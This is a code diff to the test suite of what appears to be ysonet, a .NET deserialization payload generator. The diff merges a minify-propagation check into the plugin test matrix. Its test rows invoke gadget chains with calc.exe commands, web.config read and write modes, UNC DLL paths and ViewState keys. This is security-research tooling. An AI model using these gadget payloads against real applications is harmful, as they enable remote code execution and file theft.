@@ -144,7 +144,6 @@ namespace ysonet.Tests
                 Run("Bridged gadget chains (--bgc) generate for every consumer", BridgedChainsGenerate);
                 Run("Bridged chains propagate --minify to the whole chain (raw vs min)", BridgedChainsMinifyPropagates);
                 Run("Every plugin mode/CVE/inner-gadget generates (x minify)", PluginFullMatrixGenerates);
-                Run("Plugins pass --minify into the gadget they wrap (raw vs min)", PluginsPassMinifyToGadgets);
             }
 
             Console.Error.WriteLine();
@@ -3451,76 +3450,6 @@ namespace ysonet.Tests
             finally { SafeDelete(marker); }
         }
 
-        // Minify must propagate from a PLUGIN into the gadget it wraps. Each plugin below either
-        // sets InputArgs.Minify on the gadget it drives or calls the minifier on its own template;
-        // all expose --minify. Proof the flag reaches the gadget: the plugin payload is strictly
-        // smaller with --minify than without. A dropped flag would produce an identical payload,
-        // which this test rejects. Output is deterministic for these plugins (no random crypto IV),
-        // so a size comparison is a stable proxy.
-        //
-        // Deliberately NOT in the shrink list (each for a real reason, so the coverage is honest):
-        //  - Altserialization -M SessionStateItemCollection: the gadget object is serialized by
-        //    System.Web's SessionStateItemCollection.Serialize (stock BinaryFormatter), which the
-        //    minify flag cannot reach; only the HttpStaticObjectsCollection mode routes through
-        //    GenericGenerator.Serialize and minifies. Tracked in dev-kitchen/todo.
-        //  - MachineKeySessionSecurityTokenHandler, SessionSecurityTokenHandler: their MachineKey /
-        //    DPAPI transform randomizes the bytes, so neither size nor byte comparison can prove
-        //    propagation; their InputArgs.Minify = minify wiring is verified by code.
-        //  - ViewState, Resx: they load heavy System.Web / resgen assemblies; a second in-process
-        //    size probe on top of PluginFullMatrixGenerates trips a ReflectionTypeLoadException
-        //    (a load-resource artifact, not a minify issue). Their InputArgs.Minify = minify wiring
-        //    is verified by code and they generate minify off/on in the plugin matrix.
-        // The three template plugins below (GetterCallGadgets, NetNonRceGadgets, ThirdPartyGadgets)
-        // call the minifier on their own JSON/XAML string directly, so they exercise that path too.
-        private static void PluginsPassMinifyToGadgets()
-        {
-            string innerJson = MakeTempFile("ysonet_minprop_inner.json", "{}");
-            var cells = new List<PluginCell>
-            {
-                new PluginCell("Altserialization", new[] { "-M", "HttpStaticObjectsCollection", "-c", "calc.exe" }),
-                new PluginCell("ApplicationTrust", new[] { "-c", "calc.exe" }),
-                new PluginCell("DotNetNuke", new[] { "-m", "run_command", "-c", "calc.exe" }),
-                new PluginCell("GetterCallGadgets", new[] { "-g", "PropertyGrid", "-i", innerJson }),
-                new PluginCell("NetNonRceGadgets", new[] { "-g", "PictureBox", "-f", "Json.NET", "-i", "http://localhost/y" }),
-                new PluginCell("NetNonRceGadgets", new[] { "-g", "PictureBox", "-f", "Xaml", "-i", "http://localhost/y" }),
-                new PluginCell("ThirdPartyGadgets", new[] { "-g", "GetterActiveMQObjectMessage", "-f", "Json.NET", "-i", "calc.exe" }),
-                new PluginCell("TransactionManagerReenlist", new[] { "-c", "calc.exe" }),
-            };
-
-            var problems = new List<string>();
-            try
-            {
-                foreach (PluginCell cell in cells)
-                {
-                    IPlugin instance = PluginRegistry.CreatePluginInstance(cell.Plugin);
-                    AssertTrue(PluginHasMinify(instance), cell.Plugin + " exposes a --minify option");
-                    Type ptype = instance == null ? null : instance.GetType();
-
-                    ResetPluginStatics(ptype);
-                    RunResult raw = PayloadRunner.RunPlugin(cell.Plugin, cell.Argv);
-
-                    string[] margv = new string[cell.Argv.Length + 1];
-                    Array.Copy(cell.Argv, margv, cell.Argv.Length);
-                    margv[margv.Length - 1] = "--minify";
-                    ResetPluginStatics(ptype);
-                    RunResult min = PayloadRunner.RunPlugin(cell.Plugin, margv);
-
-                    string desc = cell.Plugin + " " + string.Join(" ", cell.Argv);
-                    if (!raw.Success || RawIsEmpty(raw.Raw)) { problems.Add(desc + " -> raw " + (raw.Success ? "empty" : raw.ErrorMessage)); continue; }
-                    if (!min.Success || RawIsEmpty(min.Raw)) { problems.Add(desc + " -> min " + (min.Success ? "empty" : min.ErrorMessage)); continue; }
-                    int rl = RawLength(raw.Raw), ml = RawLength(min.Raw);
-                    if (ml >= rl)
-                        problems.Add(desc + " -> --minify did not shrink (raw=" + rl + " min=" + ml + "); the flag may not reach the wrapped gadget");
-                }
-            }
-            finally
-            {
-                SafeDelete(innerJson);
-            }
-            AssertTrue(problems.Count == 0,
-                "plugin -> gadget minify propagation failed (" + problems.Count + "):\n  " + string.Join("\n  ", problems.ToArray()));
-        }
-
         // ---- 6.4 plugin combination matrix ----
 
         // One curated row per plugin mode / CVE / inner-gadget (plugin modes are not
@@ -3530,11 +3459,30 @@ namespace ysonet.Tests
         // every discovered plugin fails the build if a plugin is neither in the matrix
         // nor explicitly excluded, so a whole new plugin cannot slip through (a new
         // plugin MODE still has to be added here by hand, by design).
+        //
+        // Minify PROPAGATION: rows tagged .Shrinks() additionally assert the minify-on payload
+        // is strictly smaller than the minify-off one (proof --minify reaches the wrapped gadget,
+        // not merely that it still generates). This reuses the two passes the matrix already runs,
+        // so there are no extra invocations. Both Altserialization modes are tagged: the Session
+        // mode's --minify path uses a byte-splice that carries a minified BF blob (its firing is
+        // covered in PayloadsFireIntoTestSinks). Minify-capable rows deliberately NOT tagged
+        // .Shrinks(): MachineKeySessionSecurityTokenHandler and SessionSecurityTokenHandler - their
+        // MachineKey / DPAPI transform randomizes and re-compresses the bytes, so neither size nor
+        // byte comparison can prove propagation; their InputArgs.Minify = minify wiring is verified
+        // by code and both still generate minify off/on here.
         private class PluginCell
         {
             public string Plugin;
             public string[] Argv;
+            // When true, PluginFullMatrixGenerates additionally asserts that --minify makes this
+            // cell's payload strictly smaller than the minify-off payload it already generates for
+            // the same cell - proof the flag reaches the wrapped gadget, not just that generation
+            // succeeds. Reusing the matrix's own two passes adds no extra plugin invocations, which
+            // matters for the heavy System.Web / resgen plugins (ViewState, Resx) whose repeated
+            // in-process loads otherwise throw a ReflectionTypeLoadException.
+            public bool ExpectShrink;
             public PluginCell(string plugin, string[] argv) { Plugin = plugin; Argv = argv; }
+            public PluginCell Shrinks() { ExpectShrink = true; return this; }
         }
 
         private static void PluginFullMatrixGenerates()
@@ -3551,25 +3499,25 @@ namespace ysonet.Tests
 
             var rows = new List<PluginCell>
             {
-                new PluginCell("Altserialization", new[] { "-M", "HttpStaticObjectsCollection", "-c", "calc.exe" }),
-                new PluginCell("Altserialization", new[] { "-M", "SessionStateItemCollection", "-c", "calc.exe" }),
+                new PluginCell("Altserialization", new[] { "-M", "HttpStaticObjectsCollection", "-c", "calc.exe" }).Shrinks(),
+                new PluginCell("Altserialization", new[] { "-M", "SessionStateItemCollection", "-c", "calc.exe" }).Shrinks(),
 
-                new PluginCell("ApplicationTrust", new[] { "-c", "calc.exe" }),
+                new PluginCell("ApplicationTrust", new[] { "-c", "calc.exe" }).Shrinks(),
 
-                new PluginCell("DotNetNuke", new[] { "-m", "run_command", "-c", "calc.exe" }),
+                new PluginCell("DotNetNuke", new[] { "-m", "run_command", "-c", "calc.exe" }).Shrinks(),
                 new PluginCell("DotNetNuke", new[] { "-m", "read_file", "-f", "web.config" }),
                 new PluginCell("DotNetNuke", new[] { "-m", "write_file", "-f", "web.config", "-u", "http://localhost/x" }),
 
-                new PluginCell("GetterCallGadgets", new[] { "-g", "PropertyGrid", "-i", innerJson }),
+                new PluginCell("GetterCallGadgets", new[] { "-g", "PropertyGrid", "-i", innerJson }).Shrinks(),
                 new PluginCell("GetterCallGadgets", new[] { "-g", "ListBox", "-m", "Items", "-i", innerJson }),
                 new PluginCell("GetterCallGadgets", new[] { "-g", "CheckedListBox", "-m", "Items", "-i", innerJson }),
                 new PluginCell("GetterCallGadgets", new[] { "-g", "ComboBox", "-m", "Items", "-i", innerJson }),
 
                 new PluginCell("MachineKeySessionSecurityTokenHandler", new[] { "-c", "calc.exe", "--validationkey", vk, "--decryptionkey", dk }),
 
-                new PluginCell("NetNonRceGadgets", new[] { "-g", "PictureBox", "-f", "Json.NET", "-i", "http://localhost/y" }),
+                new PluginCell("NetNonRceGadgets", new[] { "-g", "PictureBox", "-f", "Json.NET", "-i", "http://localhost/y" }).Shrinks(),
                 new PluginCell("NetNonRceGadgets", new[] { "-g", "PictureBox", "-f", "JavaScriptSerializer", "-i", "http://localhost/y" }),
-                new PluginCell("NetNonRceGadgets", new[] { "-g", "PictureBox", "-f", "Xaml", "-i", "http://localhost/y" }),
+                new PluginCell("NetNonRceGadgets", new[] { "-g", "PictureBox", "-f", "Xaml", "-i", "http://localhost/y" }).Shrinks(),
                 new PluginCell("NetNonRceGadgets", new[] { "-g", "InfiniteProgressPage", "-f", "Json.NET", "-i", "http://localhost/y" }),
                 new PluginCell("NetNonRceGadgets", new[] { "-g", "InfiniteProgressPage", "-f", "JavaScriptSerializer", "-i", "http://localhost/y" }),
                 new PluginCell("NetNonRceGadgets", new[] { "-g", "InfiniteProgressPage", "-f", "Xaml", "-i", "http://localhost/y" }),
@@ -3577,7 +3525,7 @@ namespace ysonet.Tests
                 new PluginCell("NetNonRceGadgets", new[] { "-g", "FileLogTraceListener", "-f", "JavaScriptSerializer", "-i", "http://localhost/y" }),
                 new PluginCell("NetNonRceGadgets", new[] { "-g", "FileLogTraceListener", "-f", "Xaml", "-i", "http://localhost/y" }),
 
-                new PluginCell("Resx", new[] { "-M", "BinaryFormatter", "-c", "calc.exe" }),
+                new PluginCell("Resx", new[] { "-M", "BinaryFormatter", "-c", "calc.exe" }).Shrinks(),
                 new PluginCell("Resx", new[] { "-M", "SoapFormatter", "-c", csFixture }),
                 new PluginCell("Resx", new[] { "-M", "indirect_resx_file", "-F", "\\\\host\\share\\a.resx" }),
                 new PluginCell("Resx", new[] { "-M", "CompiledDotResources", "-c", "calc.exe", "-of", resxOut }),
@@ -3599,7 +3547,7 @@ namespace ysonet.Tests
                 new PluginCell("ThirdPartyGadgets", new[] { "-g", "UnmanagedLibrary", "-f", "Json.NET", "-i", "\\\\host\\a.dll" }),
                 new PluginCell("ThirdPartyGadgets", new[] { "-g", "WindowsLibrary", "-f", "Json.NET", "-i", "\\\\host\\a.dll" }),
                 new PluginCell("ThirdPartyGadgets", new[] { "-g", "Xunit1Executor", "-f", "Json.NET", "-i", "\\\\host\\a.dll" }),
-                new PluginCell("ThirdPartyGadgets", new[] { "-g", "GetterActiveMQObjectMessage", "-f", "Json.NET", "-i", "calc.exe" }),
+                new PluginCell("ThirdPartyGadgets", new[] { "-g", "GetterActiveMQObjectMessage", "-f", "Json.NET", "-i", "calc.exe" }).Shrinks(),
                 new PluginCell("ThirdPartyGadgets", new[] { "-g", "PreserveWorkingFolder", "-f", "Json.NET", "-i", "targetdir" }),
                 new PluginCell("ThirdPartyGadgets", new[] { "-g", "OptimisticLockedTextFile", "-f", "Json.NET", "-i", "targetfile.txt" }),
                 new PluginCell("ThirdPartyGadgets", new[] { "-g", "QueryPartitionProvider", "-f", "Json.NET", "-i", tpqpInner }),
@@ -3607,10 +3555,10 @@ namespace ysonet.Tests
                 new PluginCell("ThirdPartyGadgets", new[] { "-g", "SingleProcessFileAppender", "-f", "Json.NET", "-i", "targetdir" }),
                 new PluginCell("ThirdPartyGadgets", new[] { "-g", "FileDataStore", "-f", "Json.NET", "-i", "targetdir" }),
 
-                new PluginCell("TransactionManagerReenlist", new[] { "-c", "calc.exe" }),
+                new PluginCell("TransactionManagerReenlist", new[] { "-c", "calc.exe" }).Shrinks(),
 
                 new PluginCell("ViewState", new[] { "--dryrun", "--validationkey", vk }),
-                new PluginCell("ViewState", new[] { "-g", "TypeConfuseDelegate", "-c", "calc.exe", "--validationkey", vk }),
+                new PluginCell("ViewState", new[] { "-g", "TypeConfuseDelegate", "-c", "calc.exe", "--validationkey", vk }).Shrinks(),
                 new PluginCell("ViewState", new[] { "--unsignedpayload", "AAECAwQFBgcICQ==", "--validationkey", vk }),
             };
 
@@ -3643,6 +3591,7 @@ namespace ysonet.Tests
 
                     // minify off, then on where supported
                     int passes = hasMinify ? 2 : 1;
+                    object rawPayload = null; // minify-off payload, to size-compare against minify-on
                     for (int mp = 0; mp < passes; mp++)
                     {
                         bool minify = mp == 1;
@@ -3662,7 +3611,22 @@ namespace ysonet.Tests
                         try { r = PayloadRunner.RunPlugin(cell.Plugin, argv); }
                         catch (Exception ex) { failures.Add(desc + " -> THREW " + ex.Message); continue; }
                         if (!r.Success) { failures.Add(desc + " -> " + r.ErrorMessage); continue; }
-                        if (RawIsEmpty(r.Raw)) { failures.Add(desc + " -> empty payload"); }
+                        if (RawIsEmpty(r.Raw)) { failures.Add(desc + " -> empty payload"); continue; }
+
+                        // Minify PROPAGATION: for a cell marked .Shrinks(), the minified payload
+                        // must be strictly smaller than the minify-off one this loop already made.
+                        // Identical size means the --minify flag never reached the wrapped gadget.
+                        if (!minify)
+                        {
+                            rawPayload = r.Raw;
+                        }
+                        else if (cell.ExpectShrink && rawPayload != null)
+                        {
+                            int rl = RawLength(rawPayload), ml = RawLength(r.Raw);
+                            if (ml >= rl)
+                                failures.Add(cell.Plugin + " " + string.Join(" ", cell.Argv)
+                                    + " -> --minify did not shrink (raw=" + rl + " min=" + ml + "); the flag may not reach the wrapped gadget");
+                        }
                     }
                 }
 
@@ -4083,6 +4047,10 @@ namespace ysonet.Tests
             // ---- Plugin MARKER via each plugin's own -t self-test path. ----
             FirePluginMarker("Altserialization", new[] { "-M", "HttpStaticObjectsCollection" }, failures, ref fired, trace);
             FirePluginMarker("Altserialization", new[] { "-M", "SessionStateItemCollection" }, failures, ref fired, trace);
+            // The Session mode --minify path uses a byte-splice that carries a minified BF blob
+            // (System.Web's own Serialize would ignore --minify); fire it minified to prove the
+            // spliced payload still deserializes and executes.
+            FirePluginMarker("Altserialization", new[] { "-M", "SessionStateItemCollection", "--minify" }, failures, ref fired, trace);
             FirePluginMarker("ApplicationTrust", new string[0], failures, ref fired, trace);
             FirePluginMarker("TransactionManagerReenlist", new string[0], failures, ref fired, trace);
 
